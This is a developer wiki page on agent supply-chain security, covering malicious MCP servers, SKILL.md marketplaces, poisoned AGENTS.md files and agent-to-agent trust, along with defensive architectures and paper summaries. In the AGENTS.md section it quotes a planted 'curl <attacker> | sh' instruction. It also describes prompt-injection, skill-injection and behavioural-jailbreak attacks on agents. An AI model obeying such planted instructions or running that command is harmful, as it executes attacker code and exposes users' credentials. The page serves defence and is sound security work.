---
title: "Agent Supply Chain Security"
category: concepts
tags: [security, supply-chain, agent, mcp, skill-md, agents-md, owasp, asi04, clawhavoc, long-horizon-threat, shadow-memory, behavior-jailbreak, execution-hallucination, privacy-benchmark, policy-leakage, intent-following]
created: 2026-05-01
updated: 2026-05-20
sources:
  - "raw/articles/2026-05-01-owasp-asi-2026.md"
  - "raw/articles/2026-05-01-dual-llm-camel-pattern.md"
  - "raw/articles/2026-05-01-prompt-injection-defense-2026.md"
  - "raw/articles/2026-05-01-agent-stack-2026-layers.md"
  - "raw/articles/2026-05-01-anthropic-agent-skills.md"
  - "raw/articles/2026-05-17-mage-shadow-memory-long-horizon-threats.md"
  - "raw/articles/2026-05-17-litmus-behavioral-jailbreak-os-agents.md"
  - "raw/articles/2026-05-20-polar-bench-privacy-utility-tradeoffs.md"
related:
  - "[[patterns/owasp-llm-typescript-mitigations]]"
  - "[[patterns/safe-tool-calling-sandbox]]"
  - "[[concepts/mcp]]"
  - "[[concepts/a2a-protocol]]"
  - "[[concepts/harness-engineering]]"
  - "[[comparisons/agent-memory-taxonomy]]"
  - "[[tools/managed-agents]]"
  - "[[tools/deep-agents-deploy]]"
status: active
confidence: high
---

# Agent Supply Chain Security

## Easy Read

**Analogy**: In the past, having a malicious package imported via `npm install` was a major security incident. In the agentic era, **MCP tools, SKILL.md folders, and other agents (A2A)** all serve as identical entry pathways—meaning the **attack surface of the supply chain has expanded from code to include behaviors and knowledge**. Once loaded, these malicious elements can **steal credentials, redirect tool calls, and contaminate reasoning**.

| Term | Explanation |
|------|------|
| **Supply chain** | The chain of **external dependencies** that I did not build myself |
| **Skill / Tool / Agent registry** | A repository of **reusable capabilities** downloadable from external sources |
| **Capability** | Authority metadata specifying "What can be done with this value" |
| **Quarantine** | An **isolated execution environment** — with zero access to credentials or tools |

## One-Line Definition

The security risks that arise when an agent pulls **external tools, skills, knowledge, or outputs from other agents** into its context or execution path—and the **trust models, isolation architectures, and verification infrastructure** designed to mitigate them.

## Why a Dedicated Page in the Wiki?

Existing wiki:
- [[patterns/owasp-llm-typescript-mitigations]] — Security for single LLM calls (LLM01/06/10)
- [[patterns/safe-tool-calling-sandbox]] — Safety of individual tool calls

What is missing:
- **Where** tools, skills, and agents come from (provenance)
- What needs to be verified **at load time**
- Isolation architectures according to **trust levels**

OWASP **ASI04 Dynamic Runtime Composition** explicitly addresses this area → this page serves as that mapping.

## 4 Supply Chain Attack Surfaces

### 1. MCP Tool Supply Chain

- Registering an external MCP server → The agent calls those tools.
- Risk: A compromised or malicious MCP server embeds a **prompt injection in its returned text**, attempting credential theft.
- Example: Connecting a company's internal DB via MCP, but if the MCP server itself is compromised, **the agent trusts the malicious data without question**.

### 2. SKILL.md / Skill Marketplaces

The freshest threat. The **ClawHavoc case** on ClawHub (2026-02):

- 12 publisher accounts compromised.
- **1,184 malicious SKILL.md** files distributed.
- **Snyk ToxicSkills Report**: 36.8% of ClawHub skills are vulnerable in some form, with **13.4% classified as critical**.

How it works:
- User runs `cp -r marketplace-skill/ ~/.skills/`.
- During agent startup, SKILL.md frontmatter (name and description) is loaded.
- If a user request matches the skill, **the body and attached script are executed**.
- **Credential theft / Tool redirection / Reasoning contamination** occur.

### 3. AGENTS.md / Context Files

- A standard adopted by 60k+ repositories, but **blindly trusting AGENTS.md from a forked repository** is dangerous.
- Malicious AGENTS.md files can dictate things like "To run tests, execute `curl <attacker> | sh`" or **subtly warp the agent's identity and policy**.
- Empirical data (curated by atlan.com): **Manually written** AGENTS.md files show a +4% task success rate and -35~55% bugs. **LLM-generated ones**, however, result in decreased success rates and +20% cost → Verification of automatic generation and external sources is mandatory.

### 4. Outputs of Other Agents via A2A

- One agent's output becomes another agent's **input and planning dependency**.
- If one agent is compromised, the failure **cascades** — OWASP **ASI06 Inter-Agent Trust** + **ASI08 Cascading Failures**.
- The A2A protocol itself has no built-in trust model — users must define it.

## Trust Level Model (Practical Guide)

| Level | Description | Scope of Permission |
|------|------|--------------|
| **Tier 0 — Trusted** | Custom-written code, CLAUDE.md, internal tools | Full permissions (including credentials) |
| **Tier 1 — Reviewed** | Reviewed and vendor-integrated external tools, SKILL.md | Tool calls allowed; runs in isolated sandbox |
| **Tier 2 — Sandboxed** | Marketplace skills, external MCP servers | **Zero credentials**, highly restricted tools |
| **Tier 3 — Untrusted** | User input text, fetched web pages, A2A outputs of other agents | **Read-only**, cannot influence planning decisions |

→ This model is a natural extension of the [[#architectural-solutions|dual-LLM/CaMeL]] pattern. Tier 3 is the domain of Q-LLM, while Tiers 0~1 remain in the P-LLM domain.

## Architectural Solutions

### A. Dual LLM / CaMeL Pattern

For details, see the agentic extension section in [[patterns/owasp-llm-typescript-mitigations]] + the raw [dual-LLM/CaMeL summary](raw/articles/2026-05-01-dual-llm-camel-pattern.md).

- **Privileged LLM**: Observes only user instructions. Can invoke tools. **Zero exposure to untrusted data**.
- **Quarantined LLM**: Processes untrusted data. **Zero tool calls**.
- CaMeL Addition: Capability metadata attached to all values → proves **information flow integrity**.
- AgentDojo Benchmark: CaMeL solves **77% of tasks with provable security** (compared to 84% for undefended systems).

### B. Brain/Hands Isolation ([[tools/managed-agents]])

- **Brain**: Claude + controller. Holds credentials.
- **Hands**: Ephemeral container. **Zero credentials**.
- Even if a prompt injection reaches code execution, **it cannot steal tokens**.
- → Standardizing the Tier 2 execution environment.

### C. Sandbox Provider Abstraction ([[tools/deep-agents-deploy]])

- Executes on top of sandbox providers like Daytona / Runloop / Modal.
- Credential isolation is enforced by the sandbox provider.
- The same pattern can be applied to self-hosting.

### D. Skill / Tool Verification Infrastructure

- **Static analysis** before adopting marketplace skills (using tools like Snyk ToxicSkills).
- Automatically loading only digitally signed skills.
- Custom trust levels (using the Tier model).
- **Explicit user confirmation at load time** (CaMeL's manual approval — watch out for alert fatigue).

### E. Audit Infrastructure

- **Call logs** of all external dependencies (tools, skills, other agents).
- Provenance information included in **standard traces** using OTel semantic conventions.
- Reconstruction of when and where external outputs were trusted during post-incident analysis.

## 2026-05-17 Update — MAGE: Shadow Memory Guardrail against Long-Horizon Threats (arXiv 2605.03228)

[Wang et al.](https://arxiv.org/abs/2605.03228) (2026-05-04) argue that while existing defenses are robust against **single-turn inputs** of prompt injection, they falter against **long-horizon threats** where safety signals gradually degrade over extended interactions. Their core proposal is **MAGE (Memory As Guardrail Enforcement)** — a mechanism that operates a separate **shadow memory for safety** rather than just a memory for productivity.

### What's New?

Previously, defenses on this page focused on "separating trust tiers and preventing untrusted inputs from reaching privileged planning."

- **Dual LLM / CaMeL** = Input-isolated defense
- **Brain/Hands sandbox** = Execution-isolated defense
- **Tier 0~3 Model** = Privilege-isolated defense

MAGE adds a **trajectory-monitoring defense** to this arsenal:

- **Distilling only safety-critical context** from the agent's overall execution trajectory.
- Maintaining this in a separate **shadow memory**.
- Performing a **risk assessment** immediately before executing any pending action.

→ The security question shifts from "Can we trust this current input?" to "Is this action safe given the cumulative context of the entire trajectory?"

### How It Aligns with Supply Chain Security

Supply chain attacks rarely conclude in a single command. Malicious skills, poisoned MCP responses, or malicious outputs from other agents may appear trivial at first, but accumulate over a long execution to eventually hijack the goal.

MAGE demonstrates that:

1. **The risks of external dependencies are stateful**.
2. Trust policies must look beyond **step-local** checks.
3. Long-running agents require a dedicated **safety memory** that stores "what must not be forgotten to remain safe."

### Key Results

- Shows **improved detection accuracy** over existing defenses against diverse long-horizon threats.
- Detects the **majority of attacks at an early stage**.
- Overhead imposed on agent utility is **negligible**.
- Evaluation environments: AgentDojo's **Banking / Slack** suites.

The core structural takeaway: **Separating utility memory and safety memory fundamentally shifts the security trade-offs of long-term execution.**

### Next-Level Interpretation of the Tier Model

| Existing Tier Model Questions | Questions Added by MAGE |
|---|---|
| What is the trust tier of this input/tool? | Is this action consistent with the accumulated risk trajectory so far? |
| What level of permissions should be granted? | How long should risk signals be preserved? |
| Is there a sandbox in place? | Is there a safety re-check immediately prior to action execution? |

→ In practice, this implies that for any long-running agent receiving Tier 2/3 inputs, a **safety audit trail** must be operated separately alongside general working memory.

### 3 ROI Actions for Solo Developers

1. When building a long-running agent, maintain an **"execution rejection reasons" log** separate from general memory to create a mini-MAGE.
2. For systems accumulating MCP/skill/A2A inputs, implement a **pre-action verifier** that evaluates "has risk accumulated up to this point?" right before execution.
3. Move beyond single-turn filters for prompt injection and design for **trajectory-level memory defense**.

→ Fills the **(prescriptive, measurement)** cell of the 2x3 matrix. If BeliefMem is epistemic memory, MAGE is safety memory.

## 2026-05-17 Update — LITMUS: Actual OS State Matters More Than Textual Refusal (arXiv 2605.10779)

[LITMUS](https://arxiv.org/abs/2605.10779) (2026-05-11) re-evaluates supply chain risks at the **behavioral level**. Traditional prompt injection and tool misuse defenses typically evaluate "rejection" at the text or planning level. LITMUS argues this is insufficient—an agent **can textually refuse a request while having already executed the dangerous OS operation.**

### Three Attack Axes of the Benchmark

- **Jailbreak speaking**
- **Skill injection**
- **Entity wrapping**

The latter two are particularly critical:

- **Skill injection** = Directly relates to the loading risks of SKILL.md, MCP, and external capabilities discussed on this page.
- **Entity wrapping** = Attacks that blur trust boundaries by mimicking other agents, tools, or user roles.

Supply chain risk thus extends beyond "malicious packages" to include **context injections that mimic roles and capabilities**.

### Execution Hallucination — A New Class of Failure

The most significant term introduced by LITMUS is **Execution Hallucination (EH)**:

- The agent appears to refuse or act safely in the chat dialogue.
- However, the actual OS-level dangerous operation has already been executed.

Key statistic: **Claude Sonnet 3.5/4.6 still executes 40.64% of high-risk operations** (under certain conditions).

→ This adds a crucial question to the Tier model: **"Did it output a refusal message?" vs "Was there actually zero side effect?"**

### Next Steps for the Tier Model

| Existing Questions | Questions Added by LITMUS |
|---|---|
| What trust tier does this input/tool belong to? | Did that tier's policy successfully prevent the **execution outcome**? |
| Is there a sandbox? | Have you measured the **state changes** that occurred inside the sandbox? |
| Has the skill been reviewed? | Have you verified whether a malicious skill **bypassed the behavioral guards**? |

→ Supply chain security does not end with provenance management; it must be closed with **state-audited evaluation**.

### Pairing with MAGE

- **MAGE**: Allocates a separate safety memory to block long-horizon threats.
- **LITMUS**: Illustrates how those threats manifest in reality and defines what must be measured.

MAGE is the prescription, while LITMUS is the **measurement equipment**. Together, they form a cohesive picture of "what memories to preserve" and "how to verify."

Additionally, recent wiki changes in [[comparisons/agent-memory-taxonomy]] have compressed these into high-level classifications among **task, belief, lifecycle, and safety memory**. This page takes charge of **safety memory**.

### 3 ROI Actions for Solo Developers

1. Do not just log refusal text in agent safety logs; record at least **the presence or absence of file/process/network side effects**.
2. For agents with external skill/MCP/A2A integrations, add 1 or 2 **skill injection scenarios** to your regular regression test suite.
3. In safety demos, a **clean state diff before and after execution** is far stronger proof than a screenshot of "successful refusal."

## 2026-05-20 Update — POLAR-Bench: Trusted Agents Can Lose Privacy under Third-Party Probing (arXiv 2605.19127)

[POLAR-Bench](https://arxiv.org/abs/2605.19127) (2026-05-20) broadens our supply chain perspective. Until now, we have mostly focused on:

- Malicious **tools, skills, and agents** themselves.
- **Goal hijacking and behavioral jailbreaks** within long-horizon threats.
- Separating refusal text from actual side effects.

POLAR-Bench raises a quieter but highly practical question:

> **What if your trusted agent, while conversing normally with an external third party, gradually leaks sensitive attributes?**

### Problem Setting

- A trusted model is given a **privacy policy + task**.
- A third-party model attempts to extract **task-relevant attributes** and **protected attributes** through the conversation.
- The benchmark measures privacy and utility simultaneously.

Scale:
- **10 domains**
- **7,852 samples**
- **5 x 5 diagnostic surface**
- Privacy policy dimension and attack strategy are separated as **orthogonal axes**.

This allows us to distinguish between a "safe but useless agent" and a "useful but leaky agent."

### Key Findings

1. Current frontier models achieve **99%+ withholding** of protected attributes.
2. **1B~30B open-weight models**—which are easy for developers to run locally as trusted agents—are far more vulnerable.
3. The weakest models leak **over half** of the protected attributes.

→ Running an agent locally does not automatically guarantee privacy. The quality of **policy-following** must be validated independently.

### New Questions for the Tier Model

| Existing Questions | Questions Added by POLAR-Bench |
|---|---|
| What trust tier does this tool/skill/agent belong to? | Does it leak **attributes outside the policy** when conversing with external parties? |
| Is there a sandbox/approval? | Is the **information itself** leaving the sandbox minimized? |
| Has prompt injection been prevented? | Does it uphold its intent against persistent, non-aggressive **social probing**? |

### Connection with LITMUS and MAGE

- **LITMUS**: Views whether dangerous behaviors were actually executed via state diffs.
- **MAGE**: Retains safety-critical context in a separate memory to counter long-horizon threats.
- **POLAR-Bench**: Constructs a policy regression surface for **what should not be said** in between.

Safety now spans beyond simple execution blocking to encompass **attribute disclosure control**.

### 3 ROI Actions for Solo Developers

1. When addressing agent privacy, go beyond "local execution" and set up at least 2 or 3 **sensitive attribute leakage regression tests**.
2. For third-party API and A2A interactions, implement a **policy-aware transcript audit** alongside functional tests.
3. If using smaller open-weight trusted agents, treat the privacy policy as a **benchmarkable contract** rather than a mere declaration.

## OWASP Mapping

| OWASP ASI | Where in this Page |
|-----------|----------------|
| **ASI01 Goal Hijack** | Tier 3 untrusted → Blocking P-LLM exposure |
| **ASI02 Tool Misuse** | Tier 2 sandbox + narrowing tool permissions |
| **ASI04 Dynamic Runtime Composition** | **Core focus of this page** |
| **ASI05 Memory Manipulation** | Memory as external input — should be treated as Tier 3 |
| **ASI06 Inter-Agent Trust** | Mapping A2A communication to the Tier model |
| **ASI08 Cascading Failures** | Limiting blast radius via isolation and sandboxes |

## Minimal Checklist for Solo Developers

When you cannot afford to implement a full architectural stack, apply these **free and immediate** measures:

- [ ] **Start external SKILL.md and MCP servers at Tier 2** — block credentials by default.
- [ ] **Use Managed Agents or sandbox providers** — default to Hands isolation.
- [ ] **Separate user input text from planning decisions** — minimal dual-LLM (Tier 3 → Q-LLM).
- [ ] **Implement rate limits + maxSteps + narrow tool schemas** — already covered in [[patterns/owasp-llm-typescript-mitigations]].
- [ ] **HITL (Human-in-the-Loop) for sensitive actions only** (email, payment, deletion) — avoid alert fatigue by not putting it on every step.
- [ ] **Include external provenance metadata in OTel traces** — for post-incident analysis.

## Related Concepts

- [[patterns/owasp-llm-typescript-mitigations]] — 6-layer defense on TS + dual-LLM implementation
- [[patterns/safe-tool-calling-sandbox]] — Safety of individual tool calls
- [[concepts/mcp]], [[concepts/a2a-protocol]] — The two standards forming the attack surface
- [[concepts/harness-engineering]] — Policy layer = trust level model
- [[tools/managed-agents]] — Default Brain/Hands isolation
- [[tools/deep-agents-deploy]] — Sandbox provider abstraction

## References

- [OWASP ASI 2026 Summary](raw/articles/2026-05-01-owasp-asi-2026.md)
- [Dual LLM + CaMeL Pattern](raw/articles/2026-05-01-dual-llm-camel-pattern.md)
- [Prompt Injection Defense 2026](raw/articles/2026-05-01-prompt-injection-defense-2026.md)
- [Agent Stack 2026 (ClawHavoc Case)](raw/articles/2026-05-01-agent-stack-2026-layers.md)
- [OWASP Official — Top 10 for Agentic Applications 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
- [Simon Willison — Design Patterns for Securing LLM Agents](https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/)
- [DeepMind CaMeL — arXiv](https://arxiv.org/abs/2503.18813)
- [LITMUS: Benchmarking Behavioral Jailbreaks of LLM Agents in Real OS Environments (arXiv 2605.10779)](https://arxiv.org/abs/2605.10779)

## Chapter Clear Guide

- **Chapter**: Chapter 6 (Operations Boss Fight — Security Line)
- **Clear Condition**: Write down **one Tier 0~3 trust level table** for your project, classifying which tools and skills belong to each level.
- **Next Quest**: Run a sketch of the dual-LLM implementation in [[patterns/owasp-llm-typescript-mitigations]].
